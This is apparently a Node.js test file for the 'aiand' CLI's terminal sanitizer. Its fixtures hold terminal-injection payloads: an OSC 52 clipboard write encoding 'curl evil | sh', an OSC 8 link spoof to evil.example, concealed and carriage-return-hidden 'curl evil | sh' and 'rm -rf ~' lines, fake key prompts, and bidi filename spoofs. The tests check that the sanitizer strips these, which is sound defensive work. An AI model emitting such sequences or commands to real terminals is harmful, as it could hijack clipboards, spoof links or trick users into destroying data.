import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import test, { describe } from "node:test";
import { pathToFileURL } from "node:url";
import {
  BIN,
  captureStdio,
  cliEnv,
  FAKE_API_KEY,
  FakeInput,
  FakeOutput,
  runCli,
  withMockGateway,
  withTestEnv,
} from "./helpers.mjs";

const {
  _setColorEnabled,
  fields,
  safeLine,
  sanitizeForTerminal,
  style,
  table,
  TerminalSanitizer,
  streamWriter,
  styled,
} = await import("../dist/cli/output.js");
const { KEY, promptSelect } = await import("../dist/cli/select.js");

const HOSTILE = [
  ["OSC 52 clipboard write (BEL)", "a\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07b", "ab"],
  ["OSC 52 clipboard write (ST)", "a\x1b]52;c;Y3VybA==\x1b\\b", "ab"],
  [
    "OSC 8 link spoof",
    "\x1b]8;;https://evil.example\x1b\\docs.aiand.com\x1b]8;;\x1b\\",
    "docs.aiand.com",
  ],
  ["OSC 0 window title", "\x1b]0;sudo me\x07ok", "ok"],
  ["8-bit OSC introducer is dropped alone", "a\x9d0;title\x9cb", "a0;titleb"],
  ["CSI cursor up + erase line", "real\x1b[1A\x1b[2Kfake", "realfake"],
  ["CSI clear screen + home", "\x1b[2J\x1b[Hpaste your key:", "paste your key:"],
  ["SGR 8 conceal", "\x1b[8mcurl evil | sh\x1b[0m", "curl evil | sh"],
  ["8-bit CSI", "p\x9b2Jq", "pq"],
  ["private-mode CSI", "\x1b[?1049hx\x1b[?25l", "x"],
  ["DCS to ST", "\x1bPq#0;2;0;0;0#0~~\x1b\\done", "done"],
  ["8-bit DCS introducer is dropped alone", "\x90secret\x9cdone", "secretdone"],
  ["SOS / PM / APC", "\x1bXs\x1b\\\x1b^p\x1b\\\x1b_a\x1b\\z", "z"],
  ["two-char ESC (save/restore cursor, charset)", "\x1b7a\x1b8\x1b(Bb\x1bc", "ab"],
  ["CAN aborts a string", "\x1b]52;c;AAAA\x18tail", "tail"],
  ["ESC inside OSC starts a new sequence", "\x1b]0;t\x1b[2Jz", "z"],
  ["lone CR cannot overwrite", "harmless\rrm -rf ~", "harmless\nrm -rf ~"],
  ["trailing CR", "line\r", "line\n"],
  ["backspace / bell / NUL / DEL", "a\b\x07\x00\x7fb", "ab"],
  ["C1 controls", "a\x80\x85\x8d\x99b", "ab"],
  ["8-bit APC introducer is dropped alone", "a\x9fhidden\x9cb", "ahiddenb"],
  ["bidi override (RLO)", "access‮level", "accesslevel"],
  ["bidi isolates and embeddings", "⁦a⁧b⁨c⁩‪d‫e‬", "abcde"],
];

const BENIGN = [
  ["Japanese", "こんにちは、世界。日本語のテキストです。"],
  ["full-width", "ＡＢＣ１２３！"],
  ["emoji", "ship it 🚀✅"],
  ["ZWJ sequence", "family 👨‍👩‍👧‍👦 and 🏳️‍🌈"],
  ["combining marks", "é ä क्ष"],
  ["code with tabs", "if (x) {\n\treturn 1;\n}\n"],
  ["CRLF", "one\r\ntwo\r\n"],
  ["RTL text without overrides", "שלום عربى"],
  ["LRM / RLM marks are kept", "a‎b‏c"],
];

/** Feed `text` through a fresh sanitizer cut at `cuts`. */
function pushInPieces(text, cuts, options) {
  const sanitizer = new TerminalSanitizer(options);
  let out = "";
  let from = 0;
  for (const cut of [...cuts, text.length]) {
    out += sanitizer.push(text.slice(from, cut));
    from = cut;
  }
  return out + sanitizer.flush();
}

describe("sanitizeForTerminal", () => {
  for (const [name, input, expected] of HOSTILE) {
    test(`strips ${name}`, () => {
      assert.equal(sanitizeForTerminal(input), expected);
    });

    test(`strips ${name} split across chunks at every point`, () => {
      for (let cut = 0; cut <= input.length; cut += 1) {
        assert.equal(pushInPieces(input, [cut]), expected, `cut at ${cut}`);
      }
      const everyChar = [...Array(input.length).keys()].slice(1);
      assert.equal(pushInPieces(input, everyChar), expected, "one code unit per chunk");
    });
  }

  for (const [name, input] of BENIGN) {
    test(`keeps ${name} byte for byte`, () => {
      assert.equal(sanitizeForTerminal(input), input);
      const everyChar = [...Array(input.length).keys()].slice(1);
      assert.equal(pushInPieces(input, everyChar), input);
    });
  }

  test("holds a CR back until it knows whether LF follows", () => {
    const sanitizer = new TerminalSanitizer();
    assert.equal(sanitizer.push("a\r"), "a");
    assert.equal(sanitizer.push("\nb"), "\r\nb");
    assert.equal(sanitizer.push("\r"), "");
    assert.equal(sanitizer.push("c"), "\nc");
    assert.equal(sanitizer.flush(), "");
  });

  test("an unterminated sequence at end of stream is dropped, not printed", () => {
    assert.equal(sanitizeForTerminal("ok\x1b]52;c;QUFB"), "ok");
    assert.equal(sanitizeForTerminal("ok\x1b["), "ok");
    assert.equal(sanitizeForTerminal("ok\x1b"), "ok");
  });

  test("a sanitizer is reusable after flush", () => {
    const sanitizer = new TerminalSanitizer();
    sanitizer.push("\x1b]0;");
    sanitizer.flush();
    assert.equal(sanitizer.push("fresh"), "fresh");
  });

  test("singleLine folds newlines, CRLF, CR, and tabs to spaces", () => {
    assert.equal(sanitizeForTerminal("a\nb\r\nc\rd\te", { singleLine: true }), "a b c d e");
  });

  test("a stray 8-bit string introducer does not swallow what follows", () => {
    assert.equal(sanitizeForTerminal("caf\u0090 rest\nline2"), "caf rest\nline2");
    for (const c1 of ["\x90", "\x98", "\x9d", "\x9e", "\x9f"]) {
      assert.equal(sanitizeForTerminal(`a${c1}b\nc`), "ab\nc", JSON.stringify(c1));
    }
    // mojibake of a curly quote: U+00E2 U+20AC U+009D
    assert.equal(
      sanitizeForTerminal("it\u00e2\u20ac\u009d s fine\nnext"),
      "it\u00e2\u20ac s fine\nnext",
    );
  });

  test("an unterminated 7-bit string ends at a newline", () => {
    assert.equal(sanitizeForTerminal("a\x1b]0;never ends\nline2"), "a\nline2");
    assert.equal(sanitizeForTerminal("a\x1bPq data\nline2"), "a\nline2");
    assert.equal(sanitizeForTerminal("a\x1b]0;x\r\nline2"), "a\nline2");
  });

  test("an unterminated 7-bit string ends after 4096 characters and prints none of itself", () => {
    const body = "x".repeat(4096);
    assert.equal(sanitizeForTerminal(`a\x1b]${body}tail`), "atail");
    assert.equal(sanitizeForTerminal(`a\x1bP${body}tail`), "atail");
    assert.equal(sanitizeForTerminal(`a\x1b]${body}Ztail`), "aZtail");
    assert.equal(sanitizeForTerminal(`a\x1b]${body.slice(1)}\x07tail`), "atail");
    assert.equal(pushInPieces(`a\x1b]${body}tail`, [100, 2000, 4000]), "atail");
  });

  test("a surrogate pair split across chunks is printed whole", () => {
    const rocket = "🚀";
    const sanitizer = new TerminalSanitizer();
    assert.equal(sanitizer.push(`go ${rocket[0]}`), "go ");
    assert.equal(sanitizer.push(`${rocket[1]}!`), `${rocket}!`);
    assert.equal(sanitizer.flush(), "");
    assert.equal(pushInPieces(`a${rocket}b`, [2]), `a${rocket}b`);
    assert.equal(pushInPieces(`a${rocket}b`, [1, 2, 3]), `a${rocket}b`);
  });

  test("a lone high surrogate is held, then flushed or followed by what comes next", () => {
    const sanitizer = new TerminalSanitizer();
    assert.equal(sanitizer.push("x\ud83d"), "x");
    assert.equal(sanitizer.flush(), "\ud83d");
    assert.equal(sanitizer.push("x\ud83d"), "x");
    assert.equal(sanitizer.push("y"), "\ud83dy");
    assert.equal(sanitizer.push("\ud83d"), "");
    assert.equal(sanitizer.push("\x1b[2J"), "\ud83d");
  });
});

describe("streamWriter", () => {
  function fakeStream(isTTY) {
    return {
      isTTY,
      text: "",
      write(chunk) {
        this.text += chunk;
        return true;
      },
    };
  }

  test("sanitises on a terminal, including sequences split across writes", () => {
    const stream = fakeStream(true);
    const writer = streamWriter(stream);
    for (const piece of ["safe ", "\x1b]52", ";c;QUFB", "\x1b", "\\after"]) writer.write(piece);
    writer.endLine();
    assert.equal(stream.text, "safe after\n");
  });

  test("passes raw bytes through when the stream is not a terminal", () => {
    const stream = fakeStream(false);
    const writer = streamWriter(stream);
    writer.write("a\x1b]52;c;QUFB\x07b\r");
    writer.endLine();
    assert.equal(stream.text, "a\x1b]52;c;QUFB\x07b\r\n");
  });

  test("decorates only non-empty safe output, and adds no newline when one ended it", () => {
    const stream = fakeStream(true);
    const writer = streamWriter(stream);
    writer.write("\x1b]0;", (s) => `[${s}]`);
    writer.write("t\x07line\n", (s) => `[${s}]`);
    writer.endLine();
    assert.equal(stream.text, "[line\n]");
  });

  test("a surrogate pair split across writes is whole on a terminal and on a pipe", () => {
    for (const isTTY of [true, false]) {
      const stream = fakeStream(isTTY);
      const writer = streamWriter(stream);
      writer.write("a🚀".slice(0, 2));
      writer.write(`${"🚀".slice(1)}b`);
      writer.endLine();
      assert.equal(stream.text, "a🚀b\n", `isTTY ${isTTY}`);
      assert.ok(!stream.text.includes("\ufffd"));
    }
  });

  test("a trailing high surrogate is flushed by endLine", () => {
    for (const isTTY of [true, false]) {
      const stream = fakeStream(isTTY);
      const writer = streamWriter(stream);
      writer.write("a\ud83d");
      writer.endLine();
      assert.equal(stream.text, "a\ud83d\n", `isTTY ${isTTY}`);
    }
  });

  test("a trailing lone CR becomes the line end on a terminal", () => {
    const stream = fakeStream(true);
    const writer = streamWriter(stream);
    writer.write("done\r");
    writer.endLine();
    assert.equal(stream.text, "done\n");
  });

  test("writes nothing at all for empty output", () => {
    const stream = fakeStream(true);
    const writer = streamWriter(stream);
    writer.write("\x1b[2J");
    writer.endLine();
    assert.equal(stream.text, "");
  });
});

const env = withTestEnv("aiand-terminal-safety-", (dir) => {
  process.env.AIAND_HOME = join(dir, "home");
  process.env.AIAND_CONFIG_DIR = dir;
  delete process.env.AIAND_API_KEY;
  delete process.env.AIAND_BASE_URL;
  delete process.env.AIAND_AUTH_URL;
  delete process.env.AIAND_PROFILE;
  process.env.CI = "1";
});

// A file: URL, because a bare C:\\ path is not a valid --import specifier on Windows.
const FAKE_TTY = new URL("./fake-tty.mjs", import.meta.url).href;
const OSC52 = "\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x1b\\";
const TITLE = "\x1b]0;pwned\x07";

function hostileCli(url, args, { tty, input, stdinTty = false, scenario = "hostile" }) {
  const cfg = mkdtempSync(join(env.dir, "cfg-"));
  mkdirSync(join(cfg, "home"), { recursive: true });
  const nodeOptions = [process.env.NODE_OPTIONS, tty ? `--import ${FAKE_TTY}` : ""]
    .filter(Boolean)
    .join(" ");
  return runCli(args, {
    env: cliEnv({
      NO_COLOR: "1",
      CI: "1",
      NODE_OPTIONS: nodeOptions,
      AIAND_TEST_FAKE_TTY_STDIN: stdinTty ? "1" : undefined,
      AIAND_CONFIG_DIR: cfg,
      AIAND_HOME: join(cfg, "home"),
      AIAND_API_KEY: FAKE_API_KEY,
      AIAND_BASE_URL: `${url}/stub/${scenario}`,
    }),
    ...(input === undefined ? { stdin: "ignore" } : { input }),
  });
}

function assertClean(text, label) {
  assert.ok(!text.includes("\x1b]"), `${label} still carries an OSC: ${JSON.stringify(text)}`);
  assert.ok(!text.includes("Y3VybCBldmlsIHwgc2g="), `${label} still carries the OSC 52 payload`);
  assert.ok(!text.includes("\x07"), `${label} still carries a BEL`);
}

/** No ESC, C0 (bar tab and newline), DEL or C1 control: nothing a terminal would act on. */
const CONTROL = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/;
const assertNoControls = (text, label) =>
  assert.ok(!CONTROL.test(text), `${label} carries a control character: ${JSON.stringify(text)}`);

// The footer line (model, cost, effort, request id) and the error report are built
// from response headers and error bodies, which a gateway or a proxy in front of it
// controls. A pipe gets the model's own bytes untouched, but these lines are cleaned
// whether or not the stream is a terminal.
describe("text built from response headers is cleaned", () => {
  const FOOTER = ["run", "-m", "m/x", "hi"];

  for (const [name, args] of [
    ["aiand run", FOOTER],
    ["aiand run --no-stream", ["run", "--no-stream", "-m", "m/x", "hi"]],
  ]) {
    for (const tty of [true, false]) {
      test(`${name} ${tty ? "on a terminal" : "piped"}: the stats footer carries no control character`, async () => {
        await withMockGateway(async ({ url }) => {
          const r = await hostileCli(url, args, { tty, scenario: "hostile-headers" });
          assert.equal(r.code, 0, r.stderr);
          assertNoControls(r.stderr, "stderr");
          assert.match(r.stderr, /req-/, "the request id is still shown");
          assert.match(r.stderr, /USD/);
          assert.match(r.stderr, /effort=high/);
        });
      });
    }
  }

  for (const tty of [true, false]) {
    test(`a failed request ${tty ? "on a terminal" : "piped"}: the report and the request id carry no control character`, async () => {
      await withMockGateway(async ({ url }) => {
        const r = await hostileCli(url, ["run", "-m", "m/error", "hi"], {
          tty,
          scenario: "hostile-headers",
        });
        assert.notEqual(r.code, 0);
        assertNoControls(r.stderr, "stderr");
        assert.match(r.stderr, /HTTP 400/);
        assert.match(r.stderr, /request id: req-/);
      });
    });
  }

  // These reach the top-level handler as errors that no earlier layer cleans
  // (ApiError makes its own text safe when it is built): a name typed on the
  // command line, and an I/O error that quotes a path.
  for (const tty of [true, false]) {
    test(`a profile name with control characters ${tty ? "on a terminal" : "piped"}: the error is one clean line`, async () => {
      await withMockGateway(async ({ url }) => {
        const r = await hostileCli(
          url,
          ["status", "--local", "--profile", "bad\x1b]0;typed-title\x07\x9b2J/name"],
          { tty, scenario: "hostile-headers" },
        );
        assert.notEqual(r.code, 0);
        assertNoControls(r.stderr, "stderr");
        assert.match(r.stderr, /Profile name "bad\/name" is not allowed/);
      });
    });
  }

  test("an unexpected error that quotes a hostile path is cleaned", {
    skip: process.platform === "win32" || process.getuid?.() === 0,
  }, async () => {
    await withMockGateway(async ({ url }) => {
      const hostileDir = join(env.dir, "cfg-\x1b]0;typed-title\x07-x");
      mkdirSync(join(hostileDir, "home"), { recursive: true });
      writeFileSync(join(hostileDir, "config.json"), "{}\n", { mode: 0o000 });
      const r = await runCli(["status", "--local"], {
        env: cliEnv({
          NO_COLOR: "1",
          CI: "1",
          AIAND_CONFIG_DIR: hostileDir,
          AIAND_HOME: join(hostileDir, "home"),
          AIAND_API_KEY: undefined,
          AIAND_BASE_URL: url,
        }),
        stdin: "ignore",
      });
      assert.notEqual(r.code, 0);
      assert.match(r.stderr, /Unexpected error/);
      assert.match(r.stderr, /EACCES/);
      assertNoControls(r.stderr, "stderr");
      assert.match(r.stderr, /cfg--x/, "the path is still shown");
    });
  });
});

describe("model output through the mock gateway", () => {
  test("aiand run on a terminal strips OSC 52 and OSC 0 from answer and reasoning", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["run", "-m", "m/x", "--show-reasoning", "-q", "hi"], {
        tty: true,
      });
      assert.equal(r.code, 0, r.stderr);
      assert.equal(r.stdout, "safe after\n");
      assertClean(r.stderr, "stderr");
      assert.match(r.stderr, /thinking: pondering/);
    });
  });

  test("aiand run --no-stream on a terminal strips them too", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(
        url,
        ["run", "--no-stream", "-m", "m/x", "--show-reasoning", "-q", "hi"],
        { tty: true },
      );
      assert.equal(r.code, 0, r.stderr);
      // The answer already ends in a newline; --no-stream prints it as a line, as before.
      assert.equal(r.stdout, "safe after\n\n");
      assertClean(r.stderr, "stderr");
      assert.match(r.stderr, /thinking: pondering/);
    });
  });

  test("piped aiand run --no-stream ends the answer with the platform's line ending", async () => {
    // os.EOL is "\r\n" on Windows, and a redirected answer must end the way
    // `out()` ended it. A preload makes any host behave like one.
    await withMockGateway(async ({ url }) => {
      const preload = join(env.dir, "crlf.mjs");
      writeFileSync(
        preload,
        'import os from "node:os";\nObject.defineProperty(os, "EOL", { value: "\\r\\n" });\n(await import("node:module")).syncBuiltinESMExports();\n',
      );
      const crlf = pathToFileURL(preload).href;
      // Not runCli: it folds CRLF into LF, and the bytes are the point.
      const child = spawn(process.execPath, [BIN, "run", "--no-stream", "-m", "m/x", "-q", "hi"], {
        env: cliEnv({
          NODE_OPTIONS: `${process.env.NODE_OPTIONS ?? ""} --import ${crlf}`,
          NO_COLOR: "1",
          AIAND_CONFIG_DIR: env.dir,
          AIAND_HOME: join(env.dir, "home"),
          AIAND_API_KEY: FAKE_API_KEY,
          AIAND_BASE_URL: url,
        }),
        stdio: ["ignore", "pipe", "pipe"],
      });
      const chunks = [];
      child.stdout.on("data", (chunk) => chunks.push(chunk));
      const code = await new Promise((resolve) => child.on("close", resolve));
      assert.equal(code, 0);
      assert.equal(
        JSON.stringify(Buffer.concat(chunks).toString()),
        JSON.stringify("echo:m/x\r\n"),
      );
    });
  });

  test("piped aiand run keeps the model's raw bytes", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["run", "-m", "m/x", "--show-reasoning", "-q", "hi"], {
        tty: false,
      });
      assert.equal(r.code, 0, r.stderr);
      assert.equal(r.stdout, `safe ${OSC52}after\n`);
      assert.ok(r.stderr.includes(`thinking: ${TITLE}pondering`), JSON.stringify(r.stderr));
    });
  });

  test("piped aiand run --no-stream keeps the raw bytes", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["run", "--no-stream", "-m", "m/x", "-q", "hi"], {
        tty: false,
      });
      assert.equal(r.code, 0, r.stderr);
      assert.equal(r.stdout, `safe ${OSC52}after\n\n`);
    });
  });

  test("aiand chat on a terminal strips the clipboard write", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["chat", "-m", "m/x", "--show-reasoning"], {
        tty: true,
        stdinTty: true,
        input: "hi\n/exit\n",
      });
      assert.equal(r.code, 0, r.stderr);
      assertClean(r.stdout, "stdout");
      assertClean(r.stderr, "stderr");
      assert.match(r.stdout, /safe after/);
      assert.match(r.stderr, /pondering/);
    });
  });
});

/** Display columns of a sanitised line, counting CJK as two (enough for these fixtures). */
function displayColumns(text) {
  let n = 0;
  for (const ch of text.replace(/\x1b\[[0-9;]*m/g, "")) {
    n += /[　-鿿＀-｠]/.test(ch) ? 2 : 1;
  }
  return n;
}

function captured(fn) {
  const io = captureStdio();
  try {
    fn();
  } finally {
    io.restore();
  }
  return io;
}

describe("server strings in tables, fields and labels", () => {
  const HOSTILE_NAMES = [
    { name: "Evil\x1b]8;;https://evil.example\x1b\\Corp\x1b]8;;\x1b\\\nInjected row", id: "org_1" },
    { name: "株式会社‮gnp.exe\x1b[2J\rテスト", id: "org_2" },
    { name: "\x1b[8mhidden\x1b[0m\x9b1A", id: "org_3" },
    { name: "Plain", id: "org_4" },
  ];

  test("safeLine folds to one plain line", () => {
    assert.equal(safeLine("a\x1b[31mb\x1b[39m\nc‮"), "ab c");
  });

  test("table cells lose escapes, newlines and bidi controls, and CJK still aligns", () => {
    const io = captured(() =>
      table(HOSTILE_NAMES, [
        { header: "name", value: (r) => r.name },
        { header: "id", value: (r) => r.id },
      ]),
    );
    const text = io.log.out.join("");
    assert.ok(!/[\x00-\x08\x0b-\x1f\x7f-\x9f‪-‮⁦-⁩]/.test(text), JSON.stringify(text));
    const lines = text.split("\n").filter(Boolean);
    assert.equal(lines.length, 5, "a newline in a cell must not add a row");
    assert.match(lines[1], /^EvilCorp Injected row\s+org_1$/);
    assert.match(lines[2], /^株式会社gnp\.exe テスト\s+org_2$/);
    assert.match(lines[3], /^hidden\s+org_3$/);
    const idColumn = lines.map((line) => displayColumns(line.slice(0, line.search(/org_|ID/))));
    assert.equal(new Set(idColumn).size, 1, `misaligned:\n${lines.join("\n")}`);
  });

  const SGR_COLUMNS = [
    { header: "a", value: () => styled(style.dim, "ok\x1b[31m") },
    { header: "b", value: () => "\x1b[5mblink\x1b[25m\x1b[31mred\x1b[39m" },
    { header: "c", value: () => ["\x1b[2m", styled(style.green, "\x1b[8mx")] },
  ];

  test("table paints sanitised cell text and never emits a server's own SGR", () => {
    // The suite runs with NO_COLOR=1; the theme honors it, so isolate the
    // color env here and restore every variable even if an assertion throws.
    const savedEnv = {
      NO_COLOR: process.env.NO_COLOR,
      COLORTERM: process.env.COLORTERM,
      TERM: process.env.TERM,
      FORCE_COLOR: process.env.FORCE_COLOR,
      AIAND_THEME: process.env.AIAND_THEME,
    };
    delete process.env.NO_COLOR;
    delete process.env.FORCE_COLOR;
    process.env.COLORTERM = "truecolor";
    // The palette is a display choice; pin the dark one the assertions encode.
    process.env.AIAND_THEME = "dark";
    if (process.env.TERM === "dumb") process.env.TERM = "xterm-256color";
    _setColorEnabled(true);
    try {
      const io = captured(() => table([{ v: "x" }], SGR_COLUMNS));
      const text = io.log.out.join("");
      assert.ok(text.includes("\x1b[2mok\x1b[22m"), JSON.stringify(text));
      // Command output paints with the brand theme: dark-palette success, not ANSI 32.
      assert.ok(text.includes("\x1b[38;2;139;213;160mx\x1b[39m"), JSON.stringify(text));
      assert.ok(text.includes("blinkred"), JSON.stringify(text));
      const sgr = text.match(/\x1b\[[0-9;]*m/g) ?? [];
      assert.deepEqual(
        sgr.filter(
          (s) => !["\x1b[2m", "\x1b[22m", "\x1b[38;2;139;213;160m", "\x1b[39m"].includes(s),
        ),
        [],
      );
    } finally {
      _setColorEnabled(false);
      for (const [key, value] of Object.entries(savedEnv)) {
        if (value === undefined) delete process.env[key];
        else process.env[key] = value;
      }
    }
  });

  test("table and fields emit no SGR at all when styling is off", () => {
    _setColorEnabled(false);
    const io = captured(() => {
      table([{ v: "x" }], SGR_COLUMNS);
      fields([
        ["k", "\x1b[31mred\x1b[39m"],
        ["j", styled(style.dim, "\x1b[31mq")],
      ]);
    });
    const text = io.log.out.join("");
    assert.ok(!text.includes("\x1b"), JSON.stringify(text));
    assert.match(text, /ok\s+blinkred\s+x/);
  });

  test("fields sanitise a server's SGR even with styling on", () => {
    _setColorEnabled(true);
    try {
      const io = captured(() => fields([["k", "\x1b[31mred\x1b[39m"]]));
      assert.ok(!io.log.out.join("").includes("\x1b[31m"));
    } finally {
      _setColorEnabled(false);
    }
  });

  test("fields values are sanitised", () => {
    const io = captured(() => fields([["email", "a@b.c\x1b]52;c;QUFB\x07\nz"]]));
    assert.equal(io.log.out.join(""), "email  a@b.c z\n");
  });

  test("select labels and the summary line are sanitised", async () => {
    const input = new FakeInput();
    const output = new FakeOutput();
    const promise = promptSelect({
      message: "Which org?",
      choices: [{ value: "org_1", label: "Evil\x1b]52;c;QUFB\x07\nCorp‮", hint: "\x1b[2Jh" }],
      input,
      output,
    });
    input.send(KEY.ENTER_CR);
    assert.equal(await promise, "org_1");
    assert.ok(!output.text.includes("\x1b]52"), JSON.stringify(output.text));
    assert.ok(!output.text.includes("‮"));
    assert.ok(!output.text.includes("\x1b[2J"));
    assert.match(output.text, /Evil Corp/);
  });
});

describe("server strings through the mock gateway", () => {
  test("aiand orgs sanitises names even when piped; --json keeps them", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["orgs"], { tty: false });
      assert.equal(r.code, 0, r.stderr);
      assert.ok(!/[\x1b\r‮]/.test(r.stdout), JSON.stringify(r.stdout));
      assert.match(r.stdout, /EvilCorp Injected row/);
      assert.match(r.stdout, /株式会社gnp\.exe テスト/);

      const j = await hostileCli(url, ["orgs", "--json"], { tty: false });
      assert.equal(j.code, 0, j.stderr);
      assert.equal(JSON.parse(j.stdout)[1].name, "株式会社‮gnp.exe\x1b[2J\rテスト");
    });
  });

  test("aiand whoami sanitises the email", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["whoami"], { tty: false });
      assert.equal(r.code, 0, r.stderr);
      assert.ok(!r.stdout.includes("\x1b]52"), JSON.stringify(r.stdout));
      assert.match(r.stdout, /mallory@example\.com\n/);
    });
  });

  test("an API error body is sanitised before it is printed", async () => {
    await withMockGateway(async ({ url }) => {
      const r = await hostileCli(url, ["logs"], { tty: false });
      assert.notEqual(r.code, 0);
      assert.ok(!/[\x07\x1b‮]/.test(r.stderr), JSON.stringify(r.stderr));
      assert.match(r.stderr, /HTTP 400: bad requestevil/);
    });
  });
});

describe("update notice", () => {
  test("a cached registry version string carrying escapes is never offered", async () => {
    const cfg = mkdtempSync(join(env.dir, "cfg-update-"));
    mkdirSync(join(cfg, "home"), { recursive: true });
    // A fresh ok-cache is trusted without touching the network; the hostile
    // string is not version-shaped, so it is dropped before anything prints it.
    writeFileSync(
      join(cfg, "update-check.json"),
      JSON.stringify({ checkedAt: Date.now(), ok: true, latest: `99.0.0${TITLE}\x1b[31mred` }),
    );
    const r = await runCli(["config", "profiles"], {
      env: cliEnv({
        NO_COLOR: "1",
        CI: undefined,
        NODE_OPTIONS: [process.env.NODE_OPTIONS, `--import ${FAKE_TTY}`].filter(Boolean).join(" "),
        AIAND_CONFIG_DIR: cfg,
        AIAND_HOME: join(cfg, "home"),
        AIAND_API_KEY: undefined,
      }),
      stdin: "ignore",
    });
    assert.equal(r.code, 0, r.stderr);
    assert.ok(!r.stderr.includes("Update available"), JSON.stringify(r.stderr));
    assertClean(r.stderr, "stderr");
    assert.ok(!r.stderr.includes("\x1b[31m"), JSON.stringify(r.stderr));
  });
});
